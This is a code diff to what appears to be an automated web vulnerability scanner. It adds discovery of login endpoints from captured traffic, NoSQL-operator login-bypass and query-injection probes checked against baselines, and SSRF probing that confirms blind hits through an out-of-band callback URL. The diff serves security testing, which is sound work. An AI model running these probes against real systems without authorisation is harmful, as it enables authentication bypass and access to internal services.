@@ -110,6 +110,29 @@ class GenericHTTPExecutor(ExecutorBase):
         discovered = self._discovered_endpoints(experiment)
         return [ep for ep in discovered if any(k in ep.lower() for k in keywords)]
 
+    def _credential_endpoints(self, experiment: SecurityExperiment) -> List[str]:
+        """Credential-accepting endpoints discovered from captured traffic — any
+        request whose body carries a password-shaped field. Finds the REAL login
+        route (e.g. /rest/user/login) regardless of its path, so we never guess
+        fixed /login paths that may not exist on the target."""
+        out, seen = [], set()
+        captured = experiment.input_parameters.get("captured_requests") or []
+        for c in (captured if isinstance(captured, list) else []):
+            if not isinstance(c, dict):
+                continue
+            u = c.get("url") or ""
+            body = c.get("post_data") or c.get("body") or ""
+            blob = (body if isinstance(body, str) else json.dumps(body)).lower()
+            if u and u not in seen and any(p in blob for p in
+                                           ("password", "passwd", '"pwd"', "pass=", "credential")):
+                seen.add(u); out.append(u)
+        return out
+
+    def _query_endpoints(self, experiment: SecurityExperiment) -> List[str]:
+        """Discovered endpoints that carry a query string (real search/filter
+        surfaces) — for operator/param injection without guessing paths."""
+        return [ep for ep in self._discovered_endpoints(experiment) if "?" in ep]
+
     def _to_paths(self, endpoints: List[str], base: str) -> List[str]:
         out = []
         for ep in endpoints:
@@ -577,37 +600,75 @@ class NoSQLiExecutor(GenericHTTPExecutor):
         base = self._base(experiment)
         findings = []
 
-        # 1. JSON body injection on auth endpoints
-        auth_eps = self._to_paths(
-            self._endpoints_by_role(experiment, "auth"), base)
+        rand = __import__("uuid").uuid4().hex[:12]
+
+        def _authed(st, bd):
+            return st in (200, 201) and any(
+                s in (bd or "").lower() for s in
+                ('"token"', '"authentication"', '"authtoken"', '"jwt"',
+                 '"sessionid"', '"session"', 'bearer ', '"success":true'))
+
+        # 1. JSON body injection on auth endpoints — DIFFERENTIAL oracle: an
+        # operator payload is only confirmed when it flips a wrong-credential
+        # baseline (unauthenticated) into an authenticated response. Endpoints
+        # that authenticate regardless of creds are skipped (can't prove bypass).
+        # Discovery-driven auth targets (never guess fixed /login paths): real
+        # credential endpoints from captured traffic, then role-keyword matches.
+        auth_urls = self._credential_endpoints(experiment) or \
+            self._endpoints_by_role(experiment, "auth")
+        auth_eps = self._to_paths(auth_urls, base)
         if not auth_eps:
-            auth_eps = ["/login", "/api/login", "/auth/login", "/api/auth"]
+            logger.info("[NoSQLi] no credential/auth endpoint discovered — skipping body injection")
+        jhdr = {"Content-Type": "application/json", "User-Agent": "AntiGravity-V2/1.0"}
         for lp in auth_eps[:8]:
+            # baseline: syntactically valid but wrong credentials (no operators)
+            b_status, b_body, _ = self._probe(
+                f"{base}{lp}", method="POST", headers=jhdr,
+                data=json.dumps({"email": f"{rand}@invalid.example",
+                                 "password": rand}).encode())
+            if _authed(b_status, b_body):
+                continue  # authenticates on garbage creds → not a valid bypass oracle
             for payload in self.NOSQLI_BODY_PAYLOADS:
                 status, body, _ = self._probe(
-                    f"{base}{lp}", method="POST",
-                    headers={"Content-Type": "application/json", "User-Agent": "AntiGravity-V2/1.0"},
+                    f"{base}{lp}", method="POST", headers=jhdr,
                     data=json.dumps(payload).encode())
-                if status == 200 and any(s in body.lower() for s in ['"token"', '"authentication"', "success", '"user"', '"session"']):
+                if _authed(status, body):  # operator flipped unauth → auth
                     findings.append({
-                        "test": "nosqli_login_bypass", "path": lp,
+                        "test": "nosqli_login_bypass", "path": lp, "confirmed": True,
+                        "sub_type": "auth_bypass_differential",
                         "payload_type": next((k for k in ["$ne", "$gt", "$regex", "$where", "$exists"]
                                               if k in json.dumps(payload)), "other"),
-                        "status": status, "body_snippet": body[:256],
+                        "status": status, "baseline_status": b_status,
+                        "detail": f"NoSQL operator flipped wrong-cred baseline "
+                                  f"({b_status}) into an authenticated response ({status}).",
+                        "body_snippet": body[:256],
                     })
                     break
 
-        # 2. Query-string operator injection on search/data endpoints
-        search_eps = self._to_paths(
-            self._endpoints_by_role(experiment, "search", "data"), base)
+        # 2. Query-string operator injection — DIFFERENTIAL: the operator must
+        # return a materially larger result set than a benign nonsense query
+        # (operator matched everything), not just any 200.
+        # Discovery-driven search/data targets + any discovered endpoint that
+        # already carries a query string. No hardcoded path guesses.
+        search_urls = self._endpoints_by_role(experiment, "search", "data") or \
+            self._query_endpoints(experiment)
+        search_eps = self._to_paths(search_urls, base)
         if not search_eps:
-            search_eps = ["/api/search", "/api/users", "/search"]
+            logger.info("[NoSQLi] no search/query endpoint discovered — skipping query injection")
         for sp in search_eps[:8]:
+            bq_status, bq_body, _ = self._probe(f"{base}{sp}?q=zz{rand}zz")
+            base_len = len(bq_body or "")
             for inject in self.NOSQLI_QS_INJECTIONS:
                 status, body, _ = self._probe(f"{base}{sp}?q{inject}")
-                if status == 200 and len(body) > 50:
+                if status == 200 and len(body or "") > max(base_len * 2, base_len + 200):
                     findings.append({"test": "nosqli_query", "path": sp,
-                                     "inject": inject, "status": status})
+                                     "inject": inject, "status": status, "confirmed": True,
+                                     "sub_type": "operator_injection_differential",
+                                     "detail": f"Operator injection returned {len(body)}b vs "
+                                               f"{base_len}b for a benign query — operator matched "
+                                               f"beyond the intended filter.",
+                                     "baseline_len": base_len})
+                    break
 
         evidence = self.collect_evidence({
             "nosqli_findings": findings, "findings_count": len(findings),
@@ -745,14 +806,27 @@ class SSRFExecutor(GenericHTTPExecutor):
                 url_params.append((f"{base}{path}?url={{}}", "url"))
 
         if not url_params:
-            # Minimal generic probes if nothing discovered
-            url_params = [
-                (f"{base}/redirect?url={{}}", "url"),
-                (f"{base}/api/proxy?url={{}}", "url"),
-            ]
+            logger.info("[SSRF] no url-shaped param discovered — skipping (no injection point)")
+
+        # Blind-SSRF confirmation via the shared OOB collaborator (generic; only
+        # when configured). Inject a unique callback URL into the url-params; a
+        # server-side fetch of it = confirmed SSRF even with no body reflection.
+        oob_tok = None
+        targets = list(self.SSRF_TARGETS)
+        try:
+            from core.oob import get_collaborator
+            _collab = get_collaborator()
+            if _collab.is_active():
+                oob_tok = _collab.new_token("ssrf")
+                marker = _collab.token_marker(oob_tok)
+                oob_url = getattr(_collab, "token_url", None)
+                oob_url = oob_url(oob_tok) if callable(oob_url) else f"http://{marker}"
+                targets.append(oob_url)
+        except Exception:
+            oob_tok = None
 
         for tmpl, param in url_params[:15]:
-            for target in self.SSRF_TARGETS:
+            for target in targets:
                 try:
                     test_url = tmpl.format(target)
                     status, body, resp_headers = self._probe(test_url)
@@ -761,12 +835,28 @@ class SSRFExecutor(GenericHTTPExecutor):
                                                                     "computeMetadata", "localhost"])) or \
                        (target.replace("http://", "") in location):
                         findings.append({
-                            "test": "ssrf", "param": param,
+                            "test": "ssrf", "param": param, "confirmed": True,
                             "template": tmpl, "target": target,
                             "status": status, "body_snippet": body[:256],
                         })
                 except Exception:
                     pass
+
+        # Poll the collaborator: any callback proves blind server-side request.
+        if oob_tok is not None:
+            try:
+                from core.oob import confirm_oob
+                hits = confirm_oob(oob_tok.token, wait_s=8.0)
+                if hits:
+                    findings.append({
+                        "test": "ssrf", "sub_type": "blind_oob", "confirmed": True,
+                        "target": "oob-callback",
+                        "detail": "Out-of-band callback received — server fetched an "
+                                  "attacker-controlled URL (blind SSRF confirmed).",
+                        "hits": len(hits) if hasattr(hits, "__len__") else 1,
+                    })
+            except Exception:
+                pass
 
         evidence = self.collect_evidence({
             "ssrf_findings": findings, "findings_count": len(findings),
